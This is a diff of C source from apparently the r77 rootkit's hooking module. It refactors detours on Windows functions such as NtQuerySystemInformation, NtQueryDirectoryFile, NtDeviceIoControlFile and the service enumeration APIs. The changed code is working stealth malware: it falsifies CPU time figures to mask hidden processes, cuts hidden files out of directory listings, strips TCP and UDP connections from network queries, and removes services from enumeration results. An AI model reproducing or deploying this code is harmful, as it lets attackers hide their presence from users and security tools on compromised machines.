@@ -1,14 +1,23 @@
 #include "Hooks.h"
 #include "Rootkit.h"
 #include "Config.h"
-#include "r77mindef.h"
 #include "r77def.h"
 #include "r77win.h"
 #include "ntdll.h"
-#include "r77runtime.h"
 #include "detours.h"
 #include <Shlwapi.h>
 #include <wchar.h>
+
+static NT_NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation;
+static NT_NTRESUMETHREAD OriginalNtResumeThread;
+static NT_NTQUERYDIRECTORYFILE OriginalNtQueryDirectoryFile;
+static NT_NTQUERYDIRECTORYFILEEX OriginalNtQueryDirectoryFileEx;
+static NT_NTENUMERATEKEY OriginalNtEnumerateKey;
+static NT_NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
+static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
+static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
+static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
+static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 
 VOID InitializeHooks()
 {
@@ -129,14 +138,15 @@ static NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS sy
 			LARGE_INTEGER hiddenUserTime = { 0 };
 			if (GetProcessHiddenTimes(&hiddenKernelTime, &hiddenUserTime, NULL))
 			{
+				PNT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION performanceInformation = (PNT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION)systemInformation;
 				ULONG numberOfProcessors = newReturnLength / sizeof(NT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION);
+
 				for (ULONG i = 0; i < numberOfProcessors; i++)
 				{
 					//TODO: This works, but it needs to be on a per-cpu basis instead of x / numberOfProcessors
-					PNT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION performanceInformation = &((PNT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION)systemInformation)[i];
-					performanceInformation->KernelTime.QuadPart += hiddenUserTime.QuadPart / numberOfProcessors;
-					performanceInformation->UserTime.QuadPart -= hiddenUserTime.QuadPart / numberOfProcessors;
-					performanceInformation->IdleTime.QuadPart += (hiddenKernelTime.QuadPart + hiddenUserTime.QuadPart) / numberOfProcessors;
+					performanceInformation[i].KernelTime.QuadPart += hiddenUserTime.QuadPart / numberOfProcessors;
+					performanceInformation[i].UserTime.QuadPart -= hiddenUserTime.QuadPart / numberOfProcessors;
+					performanceInformation[i].IdleTime.QuadPart += (hiddenKernelTime.QuadPart + hiddenUserTime.QuadPart) / numberOfProcessors;
 				}
 			}
 		}
@@ -147,10 +157,12 @@ static NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS sy
 			LONGLONG hiddenCycleTime = 0;
 			if (GetProcessHiddenTimes(NULL, NULL, &hiddenCycleTime))
 			{
-				ULONG numberOfProcessors = newReturnLength / sizeof(LARGE_INTEGER);
+				PNT_SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION idleCycleTimeInformation = (PNT_SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION)systemInformation;
+				ULONG numberOfProcessors = newReturnLength / sizeof(NT_SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION);
+
 				for (ULONG i = 0; i < numberOfProcessors; i++)
 				{
-					((PLARGE_INTEGER)systemInformation)[i].QuadPart += hiddenCycleTime / numberOfProcessors;
+					idleCycleTimeInformation[i].CycleTime += hiddenCycleTime / numberOfProcessors;
 				}
 			}
 		}
@@ -219,7 +231,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 			{
 				if (nextEntryOffset)
 				{
-					RtlCopyMemory
+					i_memcpy
 					(
 						current,
 						(LPBYTE)current + nextEntryOffset,
@@ -281,7 +293,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 				{
 					if (nextEntryOffset)
 					{
-						RtlCopyMemory
+						i_memcpy
 						(
 							current,
 							(LPBYTE)current + nextEntryOffset,
@@ -393,7 +405,7 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 		{
 			// Check, if the device is "\Device\Nsi"
 			BYTE deviceName[500];
-			if (NT_SUCCESS(NtQueryObject2(fileHandle, ObjectNameInformation, deviceName, 500, NULL)) &&
+			if (NT_SUCCESS(R77_NtQueryObject(fileHandle, ObjectNameInformation, deviceName, 500, NULL)) &&
 				!StrCmpNIW(DEVICE_NSI, ((PUNICODE_STRING)deviceName)->Buffer, sizeof(DEVICE_NSI) / sizeof(WCHAR)))
 			{
 				PNT_NSI_PARAM nsiParam = (PNT_NSI_PARAM)outputBuffer;
@@ -442,20 +454,20 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 							{
 								if (nsiParam->Type == NsiTcp)
 								{
-									RtlMoveMemory(tcpEntry, (LPBYTE)tcpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
+									memmove(tcpEntry, (LPBYTE)tcpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
 								}
 								else if (nsiParam->Type == NsiUdp)
 								{
-									RtlMoveMemory(udpEntry, (LPBYTE)udpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
+									memmove(udpEntry, (LPBYTE)udpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);
 								}
 
 								if (statusEntry)
 								{
-									RtlMoveMemory(statusEntry, (LPBYTE)statusEntry + nsiParam->StatusEntrySize, (nsiParam->Count - i - 1) * nsiParam->StatusEntrySize);
+									memmove(statusEntry, (LPBYTE)statusEntry + nsiParam->StatusEntrySize, (nsiParam->Count - i - 1) * nsiParam->StatusEntrySize);
 								}
 								if (processEntry)
 								{
-									RtlMoveMemory(processEntry, (LPBYTE)processEntry + nsiParam->ProcessEntrySize, (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
+									memmove(processEntry, (LPBYTE)processEntry + nsiParam->ProcessEntrySize, (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
 								}
 							}
 
@@ -556,7 +568,7 @@ static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CL
 
 	if (fileName && fileNameLength > 0)
 	{
-		wmemcpy(name, fileName, fileNameLength / sizeof(WCHAR));
+		i_wmemcpy(name, fileName, fileNameLength / sizeof(WCHAR));
 		name[fileNameLength / sizeof(WCHAR)] = L'\0';
 		return name;
 	}
@@ -643,7 +655,7 @@ static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD ser
 			IsServiceNameHidden(services[i].lpServiceName) ||
 			IsServiceNameHidden(services[i].lpDisplayName))
 		{
-			RtlMoveMemory(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUSW));
+			memmove(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUSW));
 			(*servicesReturned)--;
 			i--;
 		}
@@ -659,7 +671,7 @@ static VOID FilterEnumServiceStatusProcess(LPENUM_SERVICE_STATUS_PROCESSW servic
 			IsServiceNameHidden(services[i].lpServiceName) ||
 			IsServiceNameHidden(services[i].lpDisplayName))
 		{
-			RtlMoveMemory(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
+			memmove(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
 			(*servicesReturned)--;
 			i--;
 		}
